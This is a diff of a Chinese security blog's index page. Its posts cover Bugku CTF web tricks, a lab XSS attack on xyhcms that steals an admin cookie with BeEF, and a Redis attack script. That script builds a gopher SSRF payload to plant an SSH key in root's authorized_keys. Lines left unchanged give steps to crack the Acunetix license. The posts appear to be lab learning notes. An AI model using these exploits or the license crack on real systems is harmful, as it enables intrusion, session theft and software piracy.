@@ -178,6 +178,232 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/09/bugku-web-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="jojo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ChillyBerry's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/12/09/bugku-web-writeup/" class="post-title-link" itemprop="url">bugku_web_writeup</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-12-09 16:15:35 / 修改时间：18:27:08" itemprop="dateCreated datePublished" datetime="2022-12-09T16:15:35+08:00">2022-12-09</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="post"><a href="#post" class="headerlink" title="post"></a>post</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$what</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;what&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$what</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$what</span>==<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;flag&#123;****&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>post框提交what&#x3D;flag</p>
+<h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">1</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;flag&#123;**********&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>?num&#x3D;1a</p>
+<h2 id="alert"><a href="#alert" class="headerlink" title="alert"></a>alert</h2><p>右键查看源代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- &amp;#<span class="number">102</span>;&amp;#<span class="number">108</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">103</span>;&amp;#<span class="number">123</span>;&amp;#<span class="number">100</span>;&amp;#<span class="number">56</span>;&amp;#<span class="number">51</span>;&amp;#<span class="number">55</span>;&amp;#<span class="number">48</span>;&amp;#<span class="number">98</span>;&amp;#<span class="number">54</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">102</span>;&amp;#<span class="number">53</span>;&amp;#<span class="number">55</span>;&amp;#<span class="number">55</span>;&amp;#<span class="number">53</span>;&amp;#<span class="number">55</span>;&amp;#<span class="number">55</span>;&amp;#<span class="number">49</span>;&amp;#<span class="number">48</span>;&amp;#<span class="number">98</span>;&amp;#<span class="number">48</span>;&amp;#<span class="number">52</span>;&amp;#<span class="number">102</span>;&amp;#<span class="number">54</span>;&amp;#<span class="number">48</span>;&amp;#<span class="number">50</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">99</span>;&amp;#<span class="number">50</span>;&amp;#<span class="number">98</span>;&amp;#<span class="number">56</span>;&amp;#<span class="number">57</span>;&amp;#<span class="number">100</span>;&amp;#<span class="number">52</span>;&amp;#<span class="number">125</span>; --&gt;&lt;/script&gt;  </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3：</span><br><span class="line">import html</span><br><span class="line"><span class="keyword">print</span> (html.<span class="title function_ invoke__">unescape</span>(<span class="string">&#x27;XX&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><p><img src="/2022/12/09/bugku-web-writeup/image-20221209181056866.png" alt="image-20221209181056866"></p>
+<p>连续点击几次，14.jpg那边会随机变，直到跳出flag</p>
+<h2 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h2><p>访问shell.php，密码bp爆破是hack</p>
+<h2 id="本地管理员"><a href="#本地管理员" class="headerlink" title="本地管理员"></a>本地管理员</h2><p>在request头加：X-Forwarded-For：127.0.0.1<br>使用admin&#x2F;test123登录获取flag「密码bp爆破」</p>
+<h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="jojo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ChillyBerry's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/" class="post-title-link" itemprop="url">某次实战考核</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-08-18 12:19:42" itemprop="dateCreated datePublished" datetime="2022-08-18T12:19:42+08:00">2022-08-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-08-19 13:28:55" itemprop="dateModified" datetime="2022-08-19T13:28:55+08:00">2022-08-19</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>已知：连接vpn访问192.163.3.56</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/08/18/%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98%E8%80%83%E6%A0%B8/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/10/CS%E5%92%8CMSF%E8%81%94%E5%8A%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="jojo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ChillyBerry's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/08/10/CS%E5%92%8CMSF%E8%81%94%E5%8A%A8/" class="post-title-link" itemprop="url">CS和MSF联动</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-08-10 20:54:04" itemprop="dateCreated datePublished" datetime="2022-08-10T20:54:04+08:00">2022-08-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-08-11 20:42:05" itemprop="dateModified" datetime="2022-08-11T20:42:05+08:00">2022-08-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">工具</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>Cobaltstrike简介：提权、凭据导出、端口转发、socket代理、office攻击、钓鱼等功能</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/08/10/CS%E5%92%8CMSF%E8%81%94%E5%8A%A8/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/03/xycmsV3-6-xss%E6%BC%8F%E6%B4%9E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -203,7 +429,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2022-08-03 21:01:38 / 修改时间：22:07:44" itemprop="dateCreated datePublished" datetime="2022-08-03T21:01:38+08:00">2022-08-03</time>
+              <time title="创建时间：2022-08-03 21:01:38 / 修改时间：22:35:07" itemprop="dateCreated datePublished" datetime="2022-08-03T21:01:38+08:00">2022-08-03</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -229,21 +455,14 @@
           <h3 id="搭建xycms"><a href="#搭建xycms" class="headerlink" title="搭建xycms"></a>搭建xycms</h3><p>1、将uploads_code文件夹下的内容放至根目录</p>
 <p>2、访问<a target="_blank" rel="noopener" href="http://localhost/install/%E8%BF%9B%E8%A1%8C%E5%AE%89%E8%A3%85%E3%80%8C%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7xyhcms">http://localhost/install/进行安装「默认账号xyhcms</a> 密码安装时自定义 」</p>
 <p>3、安装完成后为了保证数据安全，务必删除install目录</p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在新闻中心找一篇文章评论，管理员审核后返回管理员cookie</p>
-<p><img src="/2022/08/03/xycmsV3-6-xss%E6%BC%8F%E6%B4%9E/image-20220803211212164.png" alt="image-20220803211212164"></p>
-<p>假装管理员访问后台：<a target="_blank" rel="noopener" href="http://192.168.2.142:8001/xyhai.php?s=/Login/index">http://192.168.2.142:8001/xyhai.php?s=/Login/index</a>   「xyhcms&#x2F;123456」</p>
-<p>进入评论管理审核 审核完成后点击编辑-保存-xss漏洞触发成功</p>
-<p><img src="/2022/08/03/xycmsV3-6-xss%E6%BC%8F%E6%B4%9E/image-20220803213331569.png" alt="image-20220803213331569"></p>
-<p>linux中的beef成功获取，Browser—&gt;Hooked Domain —&gt;Get Cookie</p>
-<p><img src="/2022/08/03/xycmsV3-6-xss%E6%BC%8F%E6%B4%9E/image-20220803215914100.png" alt="image-20220803215914100"></p>
-<p>管理员的cookie：cookie&#x3D;PHPSESSID&#x3D;dcc41v231dohkhp9ccsqnhn802;</p>
-<p>和我自己伪造管理员登录的cookie相同</p>
-<p><img src="/2022/08/03/xycmsV3-6-xss%E6%BC%8F%E6%B4%9E/image-20220803220016470.png" alt="image-20220803220016470"></p>
-<p>伪造身份成功登录</p>
-<p><img src="/2022/08/03/xycmsV3-6-xss%E6%BC%8F%E6%B4%9E/image-20220803220448535.png" alt="image-20220803220448535"></p>
-<p>注意：我windows虚拟机搭建的xyhcms在新增评论时，网址必须是明确的ip，不能是localhost，否则会被linux的beef识别错误。</p>
-<img src="/2022/08/03/xycmsV3-6-xss%E6%BC%8F%E6%B4%9E/image-20220803213649909.png" alt="image-20220803213649909" style="zoom:50%;">
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/08/03/xycmsV3-6-xss%E6%BC%8F%E6%B4%9E/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -370,8 +589,17 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-08-03 20:34:07" itemprop="dateModified" datetime="2022-08-03T20:34:07+08:00">2022-08-03</time>
+                <time title="修改时间：2022-08-03 22:12:20" itemprop="dateModified" datetime="2022-08-03T22:12:20+08:00">2022-08-03</time>
               </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">工具</span></a>
+                </span>
+            </span>
 
           
 
@@ -472,7 +700,7 @@
 
       
           <h2 id="aWVS"><a href="#aWVS" class="headerlink" title="aWVS"></a>aWVS</h2><p>arl-awvs.py:联合arl灯塔进行扫描</p>
-<p>用户名密码：<a href="mailto:&#x61;&#x77;&#x76;&#x73;&#x40;&#x61;&#x77;&#x76;&#115;&#x2e;&#x63;&#111;&#109;">&#x61;&#x77;&#x76;&#x73;&#x40;&#x61;&#x77;&#x76;&#115;&#x2e;&#x63;&#111;&#109;</a>&#x2F;<a href="mailto:&#65;&#119;&#x76;&#x73;&#64;&#x61;&#119;&#118;&#x73;&#x2e;&#99;&#x6f;&#x6d;">&#65;&#119;&#x76;&#x73;&#64;&#x61;&#119;&#118;&#x73;&#x2e;&#99;&#x6f;&#x6d;</a></p>
+<p>用户名密码：<a href="mailto:&#x61;&#119;&#118;&#x73;&#64;&#97;&#x77;&#118;&#x73;&#x2e;&#99;&#111;&#109;">&#x61;&#119;&#118;&#x73;&#64;&#97;&#x77;&#118;&#x73;&#x2e;&#99;&#111;&#109;</a>&#x2F;<a href="mailto:&#x41;&#119;&#x76;&#115;&#64;&#x61;&#x77;&#118;&#115;&#46;&#99;&#x6f;&#x6d;">&#x41;&#119;&#x76;&#115;&#64;&#x61;&#x77;&#118;&#115;&#46;&#99;&#x6f;&#x6d;</a></p>
 <h4 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo docker search awvs</span><br><span class="line">sudo docker pull xrsec/awvs</span><br><span class="line">docker run -it -d --name awvs -p 3445:3443 --restart=always xrsec/awvs:latest</span><br></pre></td></tr></table></figure>
 
 <h3 id="破解步骤"><a href="#破解步骤" class="headerlink" title="破解步骤"></a>破解步骤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">复制license_info.json&amp;wa_data.dat---&gt;</span><br><span class="line">windows&gt;&gt;&gt;C:/PrpgramData/Acunetix/shared/license/</span><br><span class="line">linux&gt;&gt;&gt;/home/acunetix/.acunetix/data/license/</span><br><span class="line">mac&gt;&gt;&gt;/Applications/Acunetix.app/Contents/Resources/data/license</span><br><span class="line"></span><br><span class="line">docker&gt;&gt;&gt;docker cp license_info.json&amp;wa_data.dat---&gt; doker-id:/home/acunetix/.acunetix/data/license</span><br><span class="line"></span><br><span class="line">修改hosts文件：</span><br><span class="line">windows：C:\Windows\System32\drivers\etc</span><br><span class="line">linux:/etc/hosts</span><br><span class="line">追加：</span><br><span class="line">127.0.0.1 updates.acunetix.com</span><br><span class="line">127.0.0.1 erp.acunetix.com</span><br></pre></td></tr></table></figure>
@@ -657,10 +885,16 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-07-27 12:52:02 / 修改时间：14:36:43" itemprop="dateCreated datePublished" datetime="2022-07-27T12:52:02+08:00">2022-07-27</time>
+              <time title="创建时间：2022-07-27 12:52:02" itemprop="dateCreated datePublished" datetime="2022-07-27T12:52:02+08:00">2022-07-27</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-08-06 12:14:40" itemprop="dateModified" datetime="2022-08-06T12:14:40+08:00">2022-08-06</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
@@ -682,41 +916,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h4 id="redis-server搭建"><a href="#redis-server搭建" class="headerlink" title="redis-server搭建"></a>redis-server搭建</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-2.8.17.tar.gz</span><br><span class="line">tar xzf redis-2.8.17.tar.gz</span><br><span class="line">cd redis-2.8.17</span><br><span class="line">make</span><br><span class="line">关闭客户端：redis-cli shutdown</span><br></pre></td></tr></table></figure>
-
-<h4 id="攻击机安装redis-cli远程连接工具"><a href="#攻击机安装redis-cli远程连接工具" class="headerlink" title="攻击机安装redis-cli远程连接工具"></a>攻击机安装redis-cli远程连接工具</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/redis-stable.tar.gz</span><br><span class="line">tar -zxvf redis-stable.tar.gz</span><br><span class="line">cd redis-stable</span><br><span class="line">make </span><br><span class="line">cp src/redis-cli /usr/bin/</span><br><span class="line">redis-cli -h</span><br></pre></td></tr></table></figure>
-
-<h5 id="服务端启动redis-server"><a href="#服务端启动redis-server" class="headerlink" title="服务端启动redis-server"></a>服务端启动redis-server</h5><p>修改redis.conf 添加：protected-mode no「关闭保护模式 protected-mode no 否则外部IP无法连接」</p>
-<img src="/2022/07/27/%E6%90%AD%E5%BB%BAredis-server-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20220727131302567.png" alt="image-20220727131302567" style="zoom:50%;">
-
-<p>使用配置文件启动redis服务端：redis-server redis.conf</p>
-<h5 id="客户端无密码登录redis"><a href="#客户端无密码登录redis" class="headerlink" title="客户端无密码登录redis"></a>客户端无密码登录redis</h5><p>redis-cli -h 目标主机IP</p>
-<img src="/2022/07/27/%E6%90%AD%E5%BB%BAredis-server-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20220727131933205.png" alt="image-20220727131933205" style="zoom: 33%;">
-
-<p>redis内获取当前目录：config get dir</p>
-<img src="/2022/07/27/%E6%90%AD%E5%BB%BAredis-server-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20220727132219438.png" alt="image-20220727132219438" style="zoom:33%;">
-
-<h3 id="利用gopher协议未授权访问redis"><a href="#利用gopher协议未授权访问redis" class="headerlink" title="利用gopher协议未授权访问redis"></a>利用gopher协议未授权访问redis</h3><p>利用ssrf漏洞，使用dict:&#x2F;&#x2F;可以探测是否开启6379服务</p>
-<p><a target="_blank" rel="noopener" href="http://challenge-e5e1f0e917a67d3b.sandbox.ctfhub.com:10800/?url=dict://127.0.0.1:6379">http://challenge-e5e1f0e917a67d3b.sandbox.ctfhub.com:10800/?url=dict://127.0.0.1:6379</a></p>
-<p>一、在攻击机上生成公私钥，密码设置为空</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
-
-<p>二、进入&#x2F;root&#x2F;.ssh目录，将生成的公钥保存到1.txt</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;;cat id_rsa.pub;echo -e &quot;\n\n&quot;) &gt; 1.txt</span><br></pre></td></tr></table></figure>
-
-<p>三、把1.txt内容通过Python脚本写入公钥 转化为gopher协议格式</p>
-<p><img src="/2022/07/27/%E6%90%AD%E5%BB%BAredis-server-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20220727135438236.png" alt="image-20220727135438236"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;192.168.100.84&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">ssh_pub=<span class="string">&quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCbEPsXBi9WBUKtrN3OsIzph9XAMtnZwPCI4dg/Id4yzpIBmheyplwkoPTPU0XhO61TyDMWplMnd8PKqbKkfxRl1adRxdDFZVlzQNONAtbGEE9IJeZFRA115KUm/rCuiTEwdqYQfZ+VohJcHavyJz9gjaM1DSuAAfeddCxuzqWMWaxSc13xSLUGxeBVbRLXyaXxkvlN6oEJ8ze+JEuXcn9E15mF1YvjGRRFRpIKxYAwRfNYDjin3d7dgrtlO0MNC4Geiho/NjYVuNj8y1xheYfU1dp3w7RO9h6dqzncFv/DMexjeN41Ipltswqh5FmfuuxEcTxvtKrdxsHXGSTmLbDzo598cmVKsZ+fxYIqAnxjWs+WDF1tvDLowEbJ9apIO8NmFZyVZFDHVo2cx5DrziVgknaZlfVPAMQ0WZOU0IUIMhq0r1SV5yLOYLs2COaXiS+Ra6Lspz1/Q1XjDOXkdtt1dI9dYT0nzSQzJWY6IoHHuLtNRPgNITcDr6lDu542gmM= root@kali\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;authorized_keys&quot;</span></span><br><span class="line">path=<span class="string">&quot;/root/.ssh/&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span>    </span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">    <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="title function_ invoke__">format</span>(ssh_pub.<span class="title function_ invoke__">replace</span>(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">    <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="title function_ invoke__">format</span>(path),</span><br><span class="line">    <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="title function_ invoke__">format</span>(filename),</span><br><span class="line">    <span class="string">&quot;save&quot;</span></span><br><span class="line">    ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.<span class="title function_ invoke__">insert</span>(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="title function_ invoke__">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line">    </span><br><span class="line">def <span class="title function_ invoke__">redis_format</span>(arr):</span><br><span class="line">    CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.<span class="title function_ invoke__">split</span>(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">    cmd+=<span class="string">&quot;*&quot;</span>+<span class="title function_ invoke__">str</span>(<span class="title function_ invoke__">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x in redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="title function_ invoke__">str</span>(<span class="title function_ invoke__">len</span>((x.<span class="title function_ invoke__">replace</span>(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.<span class="title function_ invoke__">replace</span>(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x in cmd:</span><br><span class="line">        payload += urllib.<span class="title function_ invoke__">quote</span>(<span class="title function_ invoke__">redis_format</span>(x))</span><br><span class="line">    <span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ssrf.py</span><br></pre></td></tr></table></figure>
-
-<p>四、通过curl使其执行</p>
-<p>p1没有成功写入原因：服务端是kali用户起的，不是root用户。改成root用户即可成功写入 &#x2F;root&#x2F;.ssh&#x2F;authorized_keys</p>
-<p><img src="/2022/07/27/%E6%90%AD%E5%BB%BAredis-server-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20220727141928099.png" alt="image-20220727141928099" style="zoom: 20%;"><img src="/2022/07/27/%E6%90%AD%E5%BB%BAredis-server-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20220727142002681.png" alt="image-20220727142002681" style="zoom:20%;"></p>
-<p>五、ssh登入目标机</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.100.84</span><br></pre></td></tr></table></figure>
-
-
+          <h4 id="redis搭建「linux」"><a href="#redis搭建「linux」" class="headerlink" title="redis搭建「linux」"></a>redis搭建「linux」</h4>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/07/27/%E6%90%AD%E5%BB%BAredis-server-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -816,206 +1024,11 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/25/002-thinkphp5-0-22%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/1.jpg">
-      <meta itemprop="name" content="jojo">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="ChillyBerry's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/07/25/002-thinkphp5-0-22%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-title-link" itemprop="url">002-thinkphp5.0.22代码审计</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
